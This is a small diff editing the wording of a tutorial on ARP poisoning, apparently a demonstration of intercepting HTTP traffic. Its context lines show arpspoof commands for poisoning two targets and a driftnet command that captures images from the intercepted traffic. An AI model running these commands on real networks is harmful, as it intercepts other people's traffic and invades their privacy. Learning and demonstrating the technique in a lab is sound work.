@@ -28,7 +28,7 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 
 ### ARP Poisoning
 
-As any user we have to create an arp poisoning in two different terminals:
+As any user, we have to set up ARP poisoning in two different terminals:
 
 ```terminal
 sudo arpspoof -i tap0 -t <target 1 ip> -r <target 2 ip or gateway>
@@ -45,4 +45,4 @@ In order to begin collecting images:
 sudo driftnet -i <network interface>
 ```
 
-The article image is a live example of HTTP delivered website and you can observe all the icons and the placeholder images.
+The article image is a live example of an HTTP-delivered website, where you can observe all the icons and the placeholder images.
